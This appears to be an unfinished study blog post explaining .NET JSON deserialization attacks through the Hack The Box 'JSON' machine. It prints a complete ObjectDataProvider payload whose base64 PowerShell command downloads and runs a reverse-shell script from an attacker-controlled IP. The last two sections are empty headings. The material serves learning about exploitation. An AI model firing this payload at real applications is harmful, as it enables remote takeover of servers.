 # Deserialization - Object Instantiation for Remote Code Execution
 
I am currently studying Offensive Security Advanced Web Attacks and Exploitation (WEB-300). One of the sections in the curriculum is a Dot Net Nuke (DNN) deserialization vulnerability leading to code execution.

I have carried out some deserialization attacks before (all legal of course), and whilst I understand the concpet behind them I had never really thought about how the RCE occurs.

I decided to have a look at the underlying .Net objects to demonstrate what is happening under the hood once the deserialization has been carried out an the object has been instantiated.

Hopefully this will help others understand why code execution is achieved.

The questions I am going to try and answer are:

- What is a deserialization vulnerability?
- What is an `ObjectDataProvider`?
- How does the PowerShell script get executed automatically?

I am not going to discuss the code of a deserialization vulnerability as that has been done many times before... maybe instantiation has too... I don't really know... or care!

## Deserialization Vulnerabilities

According to [OWASP (2017)](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization) 'the impact of deserialization flaws cannot be overstated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible'.

Serialization is the operation of taking an object or objects in memory and encoding them into a stream of bytes that can be stored (for example to a datase or file) or transmit (for example over a network). Deserialization is the opposite of serialization, a stream of bytes is taken and used to reconstruct an object or objects in memory. Examples of serialization outputs are XML and JSON.

Serialization can be very useful for transmitting objects over a network where two discontiguous systems can effectively contain the same state in terms of object instantiations.

<img width="273" alt="Screenshot 2022-06-06 at 19 05 06" src="https://user-images.githubusercontent.com/42491100/172219463-bc6dcf9e-e317-470d-abbc-a70902cfea64.png">

If the target application has a deserialization vulnerability then it may be possible to submit unsanitized JSON/XML to the web application and trigger code execution.

## An Example - JSON

The hack the box JSON machine is a perfect example to explain the underlying object instantiation. The HTTP POST payload used to exploit JSON is shown below:

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c powershell.exe  -exec bypass -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAvAHIAZQB2AC4AcABzADEAIgApAA==']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

When the web application deserializes the JSON object it spawns a reverse shell, but why?

## ObjectDataProvider



## PowerShell Execution
